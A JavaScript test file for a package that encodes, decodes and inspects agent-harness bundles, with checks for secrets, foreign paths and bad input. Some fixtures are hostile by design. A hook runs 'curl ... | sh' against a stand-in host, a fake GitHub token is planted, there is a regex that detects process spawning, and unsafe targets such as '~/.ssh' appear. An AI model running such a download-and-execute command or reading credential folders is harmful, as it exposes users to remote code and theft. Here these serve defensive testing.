// The behaviour of encode, decode, inspect, the target of an import, and the emptiness test: round trips, determinism, the summary, secrets, notes, paths of another
// computer, and misuse. Hostile input is in hostile.test.mjs and hostile-todo.test.mjs.
import test from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import {
  BUNDLE_FORMAT, EMPTY_HARNESS_DESCRIPTION, assertEmptyHarness, decodeBundle, encodeBundle, harnessPartsFound, importAcknowledgement, exportAcknowledgement, importChoicesOf, inspectBundle, isEmptyHarness,
  targetFromBundle,
} from '../../../dist/packages/harness-bundle/src/index.js';
import { loadDefinitionFiles, scanSecrets } from '../../../dist/packages/harness-definition/src/index.js';
import { exportDefinitionBundle } from '../../../dist/packages/project-sync/src/index.js';
import { bundleOf, bytesOf, definitionOf, envelopeOf, filesOf, json, parsed, refusal, richMap, sha, smallMap } from './fixture.mjs';

const same = (a, b, label) => {
  assert.deepEqual(a.map(f => f.path), b.map(f => f.path), `${label}: the same paths`);
  for (const [i, f] of a.entries()) {
    assert.ok(Buffer.from(f.bytes).equals(Buffer.from(b[i].bytes)), `${label}: ${f.path} has the same bytes`);
    assert.equal(f.executable === true, b[i].executable === true, `${label}: ${f.path} has the same execute bit`);
  }
};
const choicesFor = (decoded, raw) => importChoicesOf(raw, decoded.knowledge.map(k => k.name));
const notesMap = (extra = {}) => smallMap({ subagents: 'agents/', skills: 'skills/' }, {
  'agents/reader.md': '---\nname: reader\ndescription: A reader.\nnotes:\n  - wiki\n  - team-notes\n---\n\nRead the notes.\n',
  'agents/plain.md': '---\nname: plain\ndescription: Reads nothing.\n---\n\nHello.\n',
  'skills/review/SKILL.md': '---\nname: review\ndescription: Reviews.\n---\n\nReview.\n',
  'knowledge.json': json({ sources: [{ kind: 'wiki-folder', name: 'wiki', path: 'notes' }, { kind: 'wiki-folder', name: 'team-notes', path: '~/notes/team' }] }),
  ...extra,
});

test('the file is canonical JSON text: closed key order, 2-space indent, one final line feed, files in byte order', async () => {
  const { encoded } = await bundleOf(richMap());
  const text = Buffer.from(encoded.bytes).toString('utf8');
  assert.equal(text, `${JSON.stringify(JSON.parse(text), null, 2)}\n`);
  const doc = JSON.parse(text);
  assert.deepEqual(Object.keys(doc), ['format', 'harness', 'generator', 'revision', 'files', 'knowledge']);
  assert.equal(doc.format, BUNDLE_FORMAT);
  assert.equal(doc.harness, 'demo');
  assert.equal(doc.generator, 'bowerloom');
  assert.match(doc.revision, /^sha256:[0-9a-f]{64}$/);
  const paths = doc.files.map(f => f.path);
  assert.deepEqual(paths, [...paths].sort((a, b) => Buffer.compare(Buffer.from(a), Buffer.from(b))));
  for (const f of doc.files) assert.deepEqual(Object.keys(f).filter(k => k !== 'executable'), ['path', 'size', 'sha256', 'encoding', 'data']);
  assert.deepEqual(doc.files.filter(f => f.executable).map(f => f.path), ['scripts/lint.sh']);
  assert.equal(doc.files.every(f => f.executable === undefined || f.executable === true), true);
  assert.equal(doc.files.some(f => f.path === 'knowledge.json'), false);
  assert.equal(encoded.sha256, sha(encoded.bytes));
});

test('a generator option is written; the default is bowerloom; a bad one is refused', async () => {
  const def = definitionOf(richMap());
  assert.equal(parsed((await encodeBundle(def, { generator: 'bowerloom@0.8.0-beta.1' })).bytes).generator, 'bowerloom@0.8.0-beta.1');
  for (const bad of ['', 'a b', 'x'.repeat(101), 5, 'a\nb']) await refusal(assert, encodeBundle(def, { generator: bad }), 'BUNDLE_USAGE');
  await refusal(assert, encodeBundle(def, { other: 1 }), 'BUNDLE_USAGE');
  await refusal(assert, encodeBundle(def, { home: 5 }), 'BUNDLE_USAGE');
});

test('determinism: the same definition gives the same bytes, the same hash and the same summary', async () => {
  const a = await encodeBundle(definitionOf(richMap()));
  const b = await encodeBundle(definitionOf(richMap()));
  assert.ok(Buffer.from(a.bytes).equals(Buffer.from(b.bytes)));
  assert.equal(a.sha256, b.sha256);
  assert.deepEqual(a.summary, b.summary);
  const decoded = await decodeBundle(a.bytes);
  assert.equal(decoded.sha256, a.sha256);
  assert.equal(decoded.bytes, a.bytes.length);
});

test('round trip: encode, decode and the target give the same definition files, for a small harness and for a rich one', async () => {
  for (const [label, map] of [['small', smallMap({})], ['rich', richMap()], ['rich with a script that has no execute bit', richMap({ 'scripts/plain.sh': 'echo\n' })]]) {
    const { def, decoded } = await bundleOf(map);
    same(decoded.files, def.files, `${label}: decoded`);
    const target = targetFromBundle(decoded, importChoicesOf(null, []));
    same(target, def.files, `${label}: target`);
    const loaded = loadDefinitionFiles(target, '');
    assert.equal(loaded.ok, true, label);
    assert.equal(loaded.definition.revision, def.revision, `${label}: the revision is the same on every machine`);
  }
});

test('round trip with notes: linking each name back to its folder gives the original files, and export(import(export(x))) is byte for byte equal', async () => {
  const { def, decoded, encoded } = await bundleOf(notesMap());
  assert.deepEqual(decoded.knowledge, [{ kind: 'wiki-folder', name: 'wiki' }, { kind: 'wiki-folder', name: 'team-notes' }]);
  const linked = targetFromBundle(decoded, choicesFor(decoded, { link: { wiki: 'notes', 'team-notes': '~/notes/team' } }));
  same(linked, def.files, 'linked');
  const again = await encodeBundle(loadDefinitionFiles(linked, '').definition);
  assert.ok(Buffer.from(again.bytes).equals(Buffer.from(encoded.bytes)), 'export(import(export(x))) is byte for byte equal');
  assert.equal(again.sha256, encoded.sha256);
  // Only one linked: the other name leaves every agent, and the result loads.
  const half = targetFromBundle(decoded, choicesFor(decoded, { link: { wiki: 'notes' } }));
  assert.equal(loadDefinitionFiles(half, '').ok, true);
  assert.deepEqual(JSON.parse(Buffer.from(half.find(f => f.path === 'knowledge.json').bytes).toString('utf8')).sources, [{ kind: 'wiki-folder', name: 'wiki', path: 'notes' }]);
  assert.match(Buffer.from(half.find(f => f.path === 'agents/reader.md').bytes).toString('utf8'), /notes:\n {2}- wiki\n---/);
  // The default: notes names are left out. No source, no notes, and the files that listed none are byte for byte the originals.
  const none = targetFromBundle(decoded, importChoicesOf(undefined, []));
  assert.equal(none.some(f => f.path === 'knowledge.json'), false);
  assert.doesNotMatch(Buffer.from(none.find(f => f.path === 'agents/reader.md').bytes).toString('utf8'), /^notes:|- wiki|- team-notes/m);
  assert.equal(loadDefinitionFiles(none, '').ok, true);
  same(none.filter(f => f.path !== 'agents/reader.md'), def.files.filter(f => f.path !== 'agents/reader.md' && f.path !== 'knowledge.json'), 'the other files');
});

test('the bundle holds no path of the notes folders, no knowledge.json, and no home path', async () => {
  const { encoded } = await bundleOf(notesMap());
  const text = Buffer.from(encoded.bytes).toString('utf8');
  for (const needle of ['notes/team', '"notes"', 'knowledge.json', '~/']) assert.equal(text.includes(needle), false, needle);
  assert.equal(text.includes('bundle-notes'), false, 'the placeholder paths never leave');
});

test('a source named in no agent still travels by name; an agent that lists an unknown name is invalid', async () => {
  const { decoded, encoded } = await bundleOf(notesMap({ 'agents/reader.md': '---\nname: reader\ndescription: A reader.\n---\n\nRead.\n' }));
  assert.deepEqual(decoded.knowledge.map(k => k.name), ['wiki', 'team-notes']);
  assert.deepEqual(inspectBundle(decoded).notes.map(n => n.readBy), [[], []]);
  const doc = parsed(encoded.bytes);
  const agent = doc.files.find(f => f.path === 'agents/reader.md');
  const edited = { ...agent, data: '---\nname: reader\ndescription: A reader.\nnotes:\n  - ghost\n---\n\nRead.\n' };
  doc.files = doc.files.map(f => (f === agent ? edited : f));
  const { mend, bytesOf } = await import('./fixture.mjs');
  const error = await refusal(assert, decodeBundle(bytesOf(mend(doc))), 'BUNDLE_INVALID');
  assert.ok(error.problems.some(p => p.code === 'NOTES_SOURCE_UNKNOWN'));
  assert.equal(error.message.includes('ghost'), false, 'the message does not repeat text from the file');
});

test('the summary of the rich harness: counts, tools, code files, references with their sinks, borrowed items, and no value', async () => {
  const { encoded, decoded } = await bundleOf(richMap());
  const s = inspectBundle(decoded);
  assert.deepEqual(s, encoded.summary);
  assert.equal(s.harness, 'demo');
  assert.deepEqual(s.engines, ['claude-code', 'codex']);
  assert.equal(s.instructions, true);
  assert.deepEqual({ ...s.counts, bytes: 0 }, { skills: 2, agents: 2, mcp: 2, hooks: 2, guardrails: 4, scripts: 1, files: 13, bytes: 0 });
  assert.equal(s.counts.bytes, decoded.files.reduce((n, f) => n + f.bytes.length, 0));
  assert.deepEqual(s.tools.map(t => [t.kind, t.name, t.runsCode]), [['mcp', 'github', true], ['mcp', 'docs', false], ['hook', 'lint-on-edit', true], ['hook', 'codex-only', true]]);
  assert.deepEqual(s.tools[0].args, ['-y', 'example-github-mcp']);
  assert.equal(s.tools[1].host, 'docs.example.com');
  assert.deepEqual(s.codeFiles.map(f => [f.path, f.why]), [['hooks.json', 'hook'], ['scripts/lint.sh', 'executable']]);
  assert.deepEqual(s.secrets.map(x => [x.kind, x.name]), [['env', 'DOCS_TOKEN'], ['env', 'GITHUB_TOKEN'], ['env', 'PROJECT_DIR'], ['keychain', 'docs-api']]);
  assert.deepEqual(s.secrets.find(x => x.name === 'docs-api').sinks, [{ tool: 'docs', field: 'header', host: 'docs.example.com' }]);
  assert.deepEqual(s.secrets.find(x => x.name === 'PROJECT_DIR').sinks, [{ tool: 'lint-on-edit', field: 'command' }]);
  assert.deepEqual(s.borrowed, [{ name: 'review-kit', marketplace: 'example-market', version: '1.2.0' }]);
  assert.deepEqual(s.foreignPaths, []);
  // The acknowledgement binds the plan, the tools, the files and the references.
  assert.match(importAcknowledgement(s, ['scripts/lint.sh'], 'd'.repeat(64)), /^[0-9a-f]{64}$/);
  assert.equal(exportAcknowledgement(s, 'd'.repeat(64)), null, 'nothing to tick on export');
});

test('a reference listed twice is one entry with each sink once; the same name in an env and a header lists both sinks', async () => {
  const map = smallMap({ mcp: 'mcp.json' }, {
    'mcp.json': json({ servers: [
      { name: 'a', transport: 'http', url: 'https://one.example.test/${TENANT}/mcp', headers: { 'X-T': '${TOKEN_ONE}', 'X-U': '${TOKEN_ONE}' }, timeout: 5 },
      { name: 'b', transport: 'stdio', command: 'tool', args: ['--key', '${TOKEN_ONE}', '${TOKEN_ONE}'], env: { T: '${TOKEN_ONE}' } },
    ] }),
  });
  const { decoded } = await bundleOf(map);
  const s = inspectBundle(decoded);
  const token = s.secrets.find(x => x.name === 'TOKEN_ONE');
  assert.deepEqual(token.sinks, [{ tool: 'a', field: 'header', host: 'one.example.test' }, { tool: 'b', field: 'arg' }, { tool: 'b', field: 'env' }]);
  assert.deepEqual(s.secrets.find(x => x.name === 'TENANT').sinks, [{ tool: 'a', field: 'url', host: 'one.example.test' }]);
  assert.equal(s.secrets.length, 2);
});

test('a literal secret refuses the export with BUNDLE_SECRET_FOUND, names the file, and never shows the value', async () => {
  const token = `ghp_${'x1'.repeat(18)}`;
  const def = definitionOf(richMap());
  const bad = { ...def, files: def.files.map(f => (f.path === 'mcp.json' ? { ...f, bytes: Buffer.from(Buffer.from(f.bytes).toString('utf8').replace('${GITHUB_TOKEN}', token)) } : f)) };
  assert.ok(scanSecrets(bad.files).length > 0, 'the made-up token is a secret to the scan');
  const error = await refusal(assert, encodeBundle(bad), 'BUNDLE_SECRET_FOUND');
  assert.deepEqual(error.paths, ['mcp.json']);
  assert.equal(JSON.stringify([error.message, error.paths, error.problems]).includes(token), false);
  // The same in a skill, a script and the instructions.
  for (const [path, text] of [['scripts/lint.sh', `#!/bin/sh\nexport API_KEY=${token}\n`], ['instructions/AGENTS.md', `# Demo\n\nPassword: ${token}\n`]]) {
    const edited = { ...def, files: def.files.map(f => (f.path === path ? { ...f, bytes: Buffer.from(text) } : f)) };
    const e = await refusal(assert, encodeBundle(edited), 'BUNDLE_SECRET_FOUND');
    assert.deepEqual(e.paths, [path]);
  }
});

test('encode refuses what it cannot write back: a definition that does not load, a path that is not plain, a value that is not a definition', async () => {
  const def = definitionOf(richMap());
  await refusal(assert, encodeBundle({ ...def, files: def.files.filter(f => f.path !== 'harness.json') }), 'BUNDLE_INVALID');
  await refusal(assert, encodeBundle({ ...def, files: [...def.files, { path: 'skills/.hidden/x', bytes: Buffer.from('x') }] }), 'BUNDLE_PATH_UNSAFE');
  await refusal(assert, encodeBundle({ ...def, files: [...def.files, { path: 'scripts/A.sh', bytes: Buffer.from('x') }, { path: 'scripts/a.sh', bytes: Buffer.from('y') }] }), 'BUNDLE_PATH_UNSAFE');
  for (const bad of [null, undefined, 5, {}, { files: 5, knowledge: [] }, { files: [{ path: 5, bytes: Buffer.alloc(0) }], knowledge: [] }, { files: [], knowledge: [{ kind: 'x', name: 'y' }] }]) {
    await refusal(assert, encodeBundle(bad), 'BUNDLE_USAGE');
  }
  await refusal(assert, encodeBundle({ ...def, files: [...def.files, { path: 'scripts/big.bin', bytes: Buffer.alloc(1024 * 1024 + 1) }] }), 'BUNDLE_TOO_LARGE');
  // knowledge.json in the definition is dropped, not written.
  const withNotes = definitionOf(notesMap());
  assert.equal(withNotes.files.some(f => f.path === 'knowledge.json'), true);
  const doc = parsed((await encodeBundle(withNotes)).bytes);
  assert.equal(doc.files.some(f => f.path === 'knowledge.json'), false);
});

test('foreign paths: a home path, a drive path, ~/ and a file URL are listed with file, line and text, and need a tick; URLs and standard shebangs are not', async () => {
  const text = [
    '# Notes', '', 'Open /Users/alice/work/plan.md first.', 'On Windows it is C:\\Users\\bob\\plan.md or C:/Users/bob/plan.md.', 'The folder ~/notes/team holds more.',
    'See https://example.com/home/guide and https://example.com/Users/x for the docs.', 'Also file:///home/carol/x.txt.', 'The shell is at /bin/sh and /usr/bin/env, in a sentence.',
  ].join('\n');
  const { decoded } = await bundleOf(richMap({ 'skills/review/guide.md': `${text}\n`, 'scripts/run.sh': '#!/usr/bin/env bash\necho ok\n#!/Users/dave/bin/node\n' }));
  const hits = inspectBundle(decoded).foreignPaths;
  const found = hits.filter(h => h.path === 'skills/review/guide.md').map(h => [h.line, h.text]);
  assert.deepEqual(found, [
    [3, '/Users/alice/work/plan.md'], [4, 'C:\\Users\\bob\\plan.md'], [4, 'C:/Users/bob/plan.md'], [5, '~/notes/team'], [7, 'file:///home/carol/x.txt'],
    [8, '/bin/sh'], [8, '/usr/bin/env'],
  ]);
  const script = hits.filter(h => h.path === 'scripts/run.sh').map(h => [h.line, h.text]);
  assert.deepEqual(script, [[3, '/Users/dave/bin/node']], 'the standard interpreter on a shebang line is not a hit; a home path there is');
  for (const h of hits) assert.equal(h.sha256, sha(h.text), 'the hash covers the matched text');
  assert.match(exportAcknowledgement(inspectBundle(decoded), 'e'.repeat(64)), /^[0-9a-f]{64}$/);
});

test('foreign paths: the home folder and the user name of the exporter are matched literally, and the list ends with one line when it passes its cap', async () => {
  const map = richMap({ 'skills/review/who.md': 'Made by zelda-the-author in /srv-not-a-root/zelda-home/area, at zelda-home.\n' });
  const def = definitionOf(map);
  const plain = await encodeBundle(def);
  assert.deepEqual(plain.summary.foreignPaths, []);
  const literal = await encodeBundle(def, { home: '/srv-not-a-root/zelda-home/', user: 'zelda-the-author' });
  assert.deepEqual(literal.summary.foreignPaths.map(h => h.text), ['zelda-the-author', '/srv-not-a-root/zelda-home/area']);
  const lines = Array.from({ length: 150 }, (_, i) => `/tmp/file-${i}`).join('\n');
  const many = await encodeBundle(definitionOf(richMap({ 'skills/review/many.md': `${lines}\n` })));
  const list = many.summary.foreignPaths;
  assert.equal(list.length, 101);
  assert.match(list.at(-1).text, /^More paths of this kind were found/);
  assert.equal(list.at(-1).line, undefined);
});

test('isEmptyHarness: only a harness with no entry, instructions, source, knowledge, script or engine file is empty', async () => {
  const bare = (extra = {}) => definitionOf({ 'harness.json': json({ format: 'bowerloom/harness/v1beta1', id: 'demo', description: 'Adopted from the engine files of this project.', engines: [{ id: 'claude-code' }, { id: 'codex' }], parts: {}, ...extra }) });
  assert.equal(isEmptyHarness(bare()), true, 'a new harness: the default description and a plain list of engines');
  assert.equal(isEmptyHarness(definitionOf(smallMap({}))), false, 'a description the person wrote is a setting');
  assert.equal(isEmptyHarness(bare({ engines: [{ id: 'codex', model: 'model-a' }] })), false, 'an engine with a model');
  assert.equal(isEmptyHarness(bare({ engines: [{ id: 'codex', version: '1.2.3' }] })), false, 'an engine with a version');
  const one = (parts, extra = {}) => definitionOf({ ...smallMap(parts, extra), 'harness.json': json({ format: 'bowerloom/harness/v1beta1', id: 'demo', description: 'Adopted from the engine files of this project.', engines: [{ id: 'claude-code' }], parts }) });
  assert.equal(isEmptyHarness(one({ skills: 'skills/' }, { 'skills/x/SKILL.md': '---\nname: x\ndescription: X.\n---\n\nX.\n' })), false);
  assert.equal(isEmptyHarness(one({ 'system-prompt': 'instructions/AGENTS.md', memory: 'instructions/AGENTS.md' }, { 'instructions/AGENTS.md': '# X\n' })), false);
  assert.equal(isEmptyHarness(one({ scripts: 'scripts/' }, { 'scripts/a.sh': 'echo\n' })), false);
  assert.equal(isEmptyHarness(one({ mcp: 'mcp.json' }, { 'mcp.json': json({ servers: [{ name: 'a', transport: 'http', url: 'https://a.example.test/' }] }) })), false);
  assert.equal(isEmptyHarness(one({}, { 'knowledge.json': json({ sources: [{ kind: 'wiki-folder', name: 'wiki', path: 'notes' }] }) })), false);
  assert.equal(isEmptyHarness(one({}, { 'engines/claude-code/extra.toml': 'a = 1\n' })), false);
  assert.equal(isEmptyHarness(one({ hooks: 'hooks.json' }, { 'hooks.json': json({ hooks: [{ id: 'h', event: 'PreToolUse', matcher: 'Bash', command: 'true', strength: 'advisory' }] }) })), false, 'a hook alone');
  assert.equal(isEmptyHarness(one({ guardrails: 'guardrails.json' }, { 'guardrails.json': json({ rules: [{ id: 'r', action: 'shell', pattern: 'rm *', effect: 'deny', strength: 'enforced' }] }) })), false, 'a rule alone');
  assert.equal(isEmptyHarness(one({ guardrails: 'guardrails.json' }, { 'guardrails.json': json({ rules: [], sandbox: { id: 'box', files: true, network: false } }) })), false, 'a sandbox alone');
  assert.equal(isEmptyHarness(one({ subagents: 'agents/' }, { 'agents/a.md': '---\nname: a\ndescription: A.\n---\n\nA.\n' })), false, 'an agent alone');
  assert.equal(isEmptyHarness(one({ skills: 'skills/', plugins: 'sources.json' }, { 'skills/review/SKILL.md': '---\nname: review\ndescription: R.\n---\n\nR.\n', 'sources.json': json({ sources: [{ name: 'kit', marketplace: 'm', version: '1.0.0', items: [{ part: 'skills', id: 'review' }] }] }) })), false, 'a borrowed source');
  assert.equal(isEmptyHarness(definitionOf(richMap())), false);
  for (const bad of [null, undefined, 5, {}, { entries: null }]) assert.equal(isEmptyHarness(bad), false, 'a value that is not a definition is not empty');
});

test('decode takes a Buffer or any Uint8Array, refuses other input as BUNDLE_USAGE, and two decodes at once do not mix', async () => {
  const { encoded } = await bundleOf(richMap());
  const view = new Uint8Array(encoded.bytes);
  const [a, b] = await Promise.all([decodeBundle(Buffer.from(encoded.bytes)), decodeBundle(view)]);
  assert.equal(a.sha256, b.sha256);
  for (const bad of [null, undefined, 'text', 5, [], {}, new ArrayBuffer(8)]) await refusal(assert, decodeBundle(bad), 'BUNDLE_USAGE');
});

test('a decoded bundle is frozen, and its files are copies: changing the bytes it was made from changes nothing', async () => {
  const { encoded } = await bundleOf(richMap());
  const source = Buffer.from(encoded.bytes);
  const decoded = await decodeBundle(source);
  const before = decoded.files.map(f => sha(f.bytes));
  source.fill(0x41);
  assert.deepEqual(decoded.files.map(f => sha(f.bytes)), before);
  assert.equal(Object.isFrozen(decoded) && Object.isFrozen(decoded.files) && Object.isFrozen(decoded.knowledge), true);
  assert.throws(() => { 'use strict'; decoded.harness = 'other'; }, TypeError);
});

test('targetFromBundle refuses choices that do not fit: unknown name, both lists, unsafe folder, one folder for two names, a plain object, a forged bundle', async () => {
  const { decoded } = await bundleOf(notesMap());
  const usage = fn => assert.throws(fn, e => e.name === 'BundleRefusal' && e.code === 'BUNDLE_USAGE');
  usage(() => targetFromBundle(decoded, { link: new Map([['ghost', 'x']]), leave: new Set() }));
  usage(() => targetFromBundle(decoded, { link: new Map([['wiki', 'x']]), leave: new Set(['wiki']) }));
  usage(() => targetFromBundle(decoded, { link: new Map(), leave: new Set(['ghost']) }));
  for (const bad of ['/etc', '../up', '.hidden/x', 'a\\b', 'C:/x', '~', '~/.ssh']) usage(() => targetFromBundle(decoded, { link: new Map([['wiki', bad]]), leave: new Set() }));
  usage(() => targetFromBundle(decoded, { link: new Map([['wiki', 'same'], ['team-notes', 'same']]), leave: new Set() }));
  usage(() => targetFromBundle(decoded, null));
  usage(() => targetFromBundle(decoded, {}));
  assert.throws(() => targetFromBundle({ files: 5, knowledge: [] }, { link: new Map(), leave: new Set() }), e => e.name === 'BundleRefusal');
  assert.throws(() => targetFromBundle({ files: [], knowledge: [] }, { link: new Map(), leave: new Set() }), e => e.code === 'BUNDLE_INVALID');
  // A bundle object that this module did not make is loaded again and works the same.
  const copy = { ...decoded };
  same(targetFromBundle(copy, choicesFor(decoded, { link: { wiki: 'notes' } })), targetFromBundle(decoded, choicesFor(decoded, { link: { wiki: 'notes' } })), 'a copy');
});

test('the target never holds knowledge.json unless a name is linked, and holds no placeholder', async () => {
  const { decoded } = await bundleOf(notesMap());
  for (const target of [targetFromBundle(decoded, choicesFor(decoded, null)), targetFromBundle(decoded, choicesFor(decoded, { link: { wiki: 'notes' } }))]) {
    for (const f of target) assert.equal(Buffer.from(f.bytes).toString('utf8').includes('bundle-notes'), false, f.path);
  }
});

test('the package source spawns nothing, evaluates nothing and imports nothing at run time', async () => {
  const fs = await import('node:fs');
  const dir = new URL('../src/', import.meta.url);
  const files = fs.readdirSync(dir).filter(n => n.endsWith('.ts'));
  assert.ok(files.length >= 10);
  const forbidden = /\bchild_process\b|\bnode:vm\b|\bvm\.|\beval\b|\bFunction\s*\(|\bimport\s*\(|\brequire\s*\(|\bworker_threads\b|\bspawn(?:Sync)?\b|\bexec(?:Sync|File|FileSync)\s*\(/;
  for (const name of files) {
    const text = fs.readFileSync(new URL(name, dir), 'utf8');
    for (const [i, line] of text.split('\n').entries()) assert.doesNotMatch(line, forbidden, `${name}:${i + 1}`);
  }
});

test('a hook that downloads and runs a script is data: it is listed, flagged, bound by the acknowledgement, and written as the text it is', async () => {
  const command = 'curl https://x.example.test/i.sh | sh';
  const hook = { id: 'fetch', event: 'PreToolUse', matcher: 'Bash', command, strength: 'advisory' };
  const { decoded } = await bundleOf(smallMap({ hooks: 'hooks.json' }, { 'hooks.json': json({ hooks: [hook] }) }));
  const summary = inspectBundle(decoded);
  assert.deepEqual(summary.tools.map(t => [t.kind, t.name, t.runsCode, t.command]), [['hook', 'fetch', true, command]]);
  assert.deepEqual(summary.codeFiles.map(f => [f.path, f.why]), [['hooks.json', 'hook']]);
  const ack = importAcknowledgement(summary, [], 'f'.repeat(64));
  assert.match(ack, /^[0-9a-f]{64}$/, 'it needs a tick');
  const other = await bundleOf(smallMap({ hooks: 'hooks.json' }, { 'hooks.json': json({ hooks: [{ ...hook, command: 'curl https://y.example.test/i.sh | sh' }] }) }));
  assert.notEqual(importAcknowledgement(inspectBundle(other.decoded), [], 'f'.repeat(64)), ack, 'another command is another tick');
  const target = targetFromBundle(decoded, importChoicesOf(null, []));
  assert.equal(JSON.parse(Buffer.from(target.find(f => f.path === 'hooks.json').bytes).toString('utf8')).hooks[0].command, command, 'the text is written as it is, never changed or run');
});

test('a tool is shown whole: a command of 4,000 characters and 64 arguments appear in full, and the summary equals the entry', async () => {
  const command = 'x'.repeat(4000);
  const args = Array.from({ length: 64 }, (_, i) => `--option-${i}=value-${i}`);
  const map = smallMap({ mcp: 'mcp.json', hooks: 'hooks.json' }, {
    'mcp.json': json({ servers: [{ name: 'a', transport: 'stdio', command, args: args.slice(0, 21) }, { name: 'b', transport: 'stdio', command: 'tool', args }, { name: 'c', transport: 'http', url: `https://${'h'.repeat(300)}.example/` }] }),
    'hooks.json': json({ hooks: [{ id: 'long', event: 'PreToolUse', matcher: 'Bash', command: 'y'.repeat(4000), strength: 'advisory' }] }),
  });
  const { decoded } = await bundleOf(map);
  const [a, b, c, hook] = inspectBundle(decoded).tools;
  assert.equal(a.command, command, 'the whole command');
  assert.deepEqual(a.args, args.slice(0, 21), 'a tool with 21 arguments shows all 21');
  assert.deepEqual(b.args, args, 'and a tool with 64 shows all 64');
  assert.equal(hook.command, 'y'.repeat(4000), 'a hook command is whole too');
  assert.ok(c.host.length <= 201, 'the host is still cut');
  assert.match(a.sha256, /^[0-9a-f]{64}$/);
});

test('a tool whose command or arguments are too long to show in full is refused BUNDLE_INVALID, on decode and on encode, and the words say so', async () => {
  const tooLong = ['x'.repeat(4001)];
  const cases = [
    ['an MCP command of 4,001 characters', smallMap({ mcp: 'mcp.json' }, { 'mcp.json': json({ servers: [{ name: 'a', transport: 'stdio', command: tooLong[0] }] }) }), 'mcp.json: a'],
    ['a server with 65 arguments', smallMap({ mcp: 'mcp.json' }, { 'mcp.json': json({ servers: [{ name: 'a', transport: 'stdio', command: 'tool', args: Array.from({ length: 65 }, (_, i) => `a${i}`) }] }) }), 'mcp.json: a'],
    ['a hook command of 4,001 characters', smallMap({ hooks: 'hooks.json' }, { 'hooks.json': json({ hooks: [{ id: 'h', event: 'PreToolUse', matcher: 'Bash', command: tooLong[0], strength: 'advisory' }] }) }), 'hooks.json: h'],
  ];
  for (const [label, map, where] of cases) {
    const def = definitionOf(map);
    const e = await refusal(assert, encodeBundle(def), 'BUNDLE_INVALID');
    assert.match(e.message, /too long to show in full/, label);
    assert.ok(e.paths[0].includes(where), label);
    assert.ok(e.problems.some(p => p.code === 'TOOL_TEXT_TOO_LONG'), label);
    // A forged bundle of the same files is refused on decode in the same way.
    const records = def.files.filter(f => f.path !== 'knowledge.json').map(f => ({ path: f.path, size: f.bytes.length, sha256: sha(f.bytes), encoding: 'utf8', data: Buffer.from(f.bytes).toString('utf8') }));
    const d = await refusal(assert, decodeBundle(bytesOf(envelopeOf(records))), 'BUNDLE_INVALID');
    assert.match(d.message, /too long to show in full/, label);
    assert.equal(d.message.includes(tooLong[0]), false, 'the command is not repeated');
  }
  // The limits themselves: exactly 4,000 characters and 64 arguments pass.
  assert.ok(await bundleOf(smallMap({ mcp: 'mcp.json' }, { 'mcp.json': json({ servers: [{ name: 'a', transport: 'stdio', command: 'x'.repeat(4000), args: Array.from({ length: 64 }, (_, i) => `a${i}`) }] }) })));
});

test('a different command of the same length changes the acknowledgement, and the whole text is in the summary the person reads', async () => {
  const mk = tail => bundleOf(smallMap({ mcp: 'mcp.json' }, { 'mcp.json': json({ servers: [{ name: 'a', transport: 'stdio', command: 'x'.repeat(3990) + tail }] }) }));
  const one = inspectBundle((await mk('0123456789')).decoded), two = inspectBundle((await mk('9876543210')).decoded);
  assert.equal(one.tools[0].command.endsWith('0123456789'), true, 'the end of a long command is shown');
  assert.notEqual(importAcknowledgement(one, [], 'a'.repeat(64)), importAcknowledgement(two, [], 'a'.repeat(64)));
});

test('the files helper keeps order and execute bits', () => {
  const files = filesOf({ a: 'x', 'scripts/lint.sh': 'y', b: undefined });
  assert.deepEqual(files.map(f => [f.path, f.executable]), [['a', false], ['scripts/lint.sh', true]]);
});

test('project-sync re-exports the encoder of this package, so the two cannot drift apart', async () => {
  // The packaging allowlist of the command line lists this package, so project-sync no longer keeps an export of its own.
  const { def, decoded } = await bundleOf(notesMap());
  const where = { home: '/nonexistent-home', user: 'tester-account' };
  const viaProjectSync = await exportDefinitionBundle(def, where), direct = await encodeBundle(def, where);
  assert.ok(Buffer.from(viaProjectSync.bytes).equals(Buffer.from(direct.bytes)), 'the same bytes');
  assert.equal(viaProjectSync.sha256, direct.sha256);
  assert.equal(decoded.harness, def.harness.id);
});

test('a harness with settings only is not empty: the description constant is one value, and the refusal names what it found', () => {
  const adoption = fs.readFileSync(new URL('../../adoption/src/plan.ts', import.meta.url), 'utf8');
  assert.match(adoption, /EMPTY_HARNESS_DESCRIPTION/, 'adoption writes the constant, not a copy of its text');
  assert.doesNotMatch(adoption, /'Adopted from the engine files of this project\.'/);
  assert.equal(EMPTY_HARNESS_DESCRIPTION, 'Adopted from the engine files of this project.');
  const bare = (extra = {}) => definitionOf({ 'harness.json': json({ format: 'bowerloom/harness/v1beta1', id: 'demo', description: EMPTY_HARNESS_DESCRIPTION, engines: [{ id: 'claude-code' }, { id: 'codex' }], parts: {}, ...extra }) });
  assert.deepEqual(harnessPartsFound(bare()), []);
  assert.doesNotThrow(() => assertEmptyHarness(bare()));
  const cases = [
    [bare({ description: 'Notes for the rope yard.' }), ['a description you wrote']],
    [bare({ engines: [{ id: 'codex', model: 'model-a' }] }), ['an engine with a version or a model']],
    [bare({ engines: [{ id: 'claude-code', version: '1.2.3' }, { id: 'codex' }] }), ['an engine with a version or a model']],
    [bare({ overrides: [{ part: 'skills', id: 'review', action: 'hide' }] }), ['an override']],
  ];
  for (const [def, expected] of cases) {
    assert.deepEqual(harnessPartsFound(def), expected);
    assert.equal(isEmptyHarness(def), false, 'settings only: not empty');
    assert.throws(() => assertEmptyHarness(def), err => err.name === 'BundleRefusal' && err.code === 'IMPORT_FOLDER_HAS_HARNESS' && JSON.stringify(err.paths) === JSON.stringify(expected));
  }
  const rich = harnessPartsFound(definitionOf(richMap()));
  for (const part of ['skills', 'agents', 'guardrails', 'hooks', 'tools', 'instructions', 'borrowed sources', 'scripts', 'engine files', 'a description you wrote']) assert.ok(rich.includes(part), part);
  assert.deepEqual(harnessPartsFound(null), ['a harness that cannot be read'], 'fails closed');
  assert.deepEqual(harnessPartsFound({ entries: null }), ['a harness that cannot be read']);
  assert.throws(() => assertEmptyHarness(bare({ description: 'x' })), e => e.message.endsWith('a description you wrote.'));
});
